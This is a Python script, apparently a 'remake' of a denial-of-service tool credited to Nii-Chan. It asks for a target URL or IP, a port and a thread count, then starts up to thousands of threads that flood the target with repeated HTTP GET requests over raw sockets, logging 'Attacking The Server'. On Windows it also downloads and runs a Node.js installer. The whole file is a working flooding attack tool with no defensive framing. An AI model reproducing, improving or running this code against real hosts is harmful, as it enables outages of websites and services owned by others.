#Remaked by GaLViN Credit to Nii-Chan 
#Python3

import os, sys
import requests, urllib3
import socket, socks, threading, random, re, os
import sys, glob, time, requests, ssl, webbrowser
import bz2, datetime, wget, json, cfscrape, urllib3
from time import sleep
from os import system
from sys import stdout
from scapy.all import *
from random import randint
os.system('cls')

urllib3.disable_warnings()
urllib3.PoolManager()

useragents=[""]

ref = [""]

acceptall = [""]  


def logo():
    os.system('color 4')
    print("")
    try:
        print(" Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print(" Method : " +str(name_method_attack))
    except:
        pass
    try:
        print(" Mode   : " +str(filenam2))
    except:
        pass
    try:
        print(" Threads: " +str(threads))
    except:
        pass

def start_url():
    global url, url_main, host_url, host_ip, port
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        path = "C:/Program Files/nodejs/node.exe"
        if (not os.path.isfile(path)):
            print("[!] Please Install NodeJs. Downloading... [!]")
            down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
            down
            os.system("node-v12.13.0-x64.msi")#Credit to Nii-Chan
    logo()
    url = input("Target [URL/IP]: ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("You Mistyped, Try Again ")
        start_url()
    logo()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    host_ip = socket.gethostbyname(host_url)
    start_port()
    logo()
    choice_method_attack()

def start_port():
    global port
    print("-----------------------------")
    port = str(input(" Port: "))
    if port == '':
        if "http" in url:
                port = int(80)
                print(" Selected Port = 80")
        else:
            port = int(80)
            print(" Selected Port = 80 ")
    else:
        port = int(port)

def start_mode():
    global choice_mode, filenam1, filenam2, method_pass_cf
    print("")
    choice_mode = input(" MODE [TYE 0] ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
    else:
        print (" You mistyped, try again ")
        start_mode()


def choice_method_attack():
    global method_attack, name_method_attack
    print("-----------------------------")
    print(" 1: HTTP Request [ Normal ]")
    print(" 2: HTTP Request [  Spam  ]")
    method_attack = input("Choice Request [1/2]: ")
    if (method_attack == "1") or (method_attack == ""):
        name_method_attack = "Normal"
        print(" Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print(" Selected Method Attack Spam")
    else:
        print ("You mistyped, try again ")
        choice_method_attack()
    logo()
    start_mode()



def numthreads():
    global threads
    try:
        print("-----------------------------")
        threads = int(input(" Threads [2000]: "))
    except ValueError:
        threads = int(2000)
        print (" Selected Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('Press "Enter" to start DoS ')
    if choice6 == "":
        attack()
        print()
    else:
        sys.exit()

def attack():
    global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
    x     = int(0)
    error = int(0)
    req_code = int(0)
    multiple = int(100)
    connection = "Connection: Keep-Alive\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    if choice_mode == "0":
        for x in range(threads):
            Home(x+1).start()

class Home(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + content + length + "\r\n"
        else:
            get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("HTTP Request to The Server "  " => " +str(host_url)+ ":" +str(port))
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        print("Attacking The Server "  " => " +str(host_url)+ ":" +str(port))
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass

if __name__ == '__main__':
    start_url()
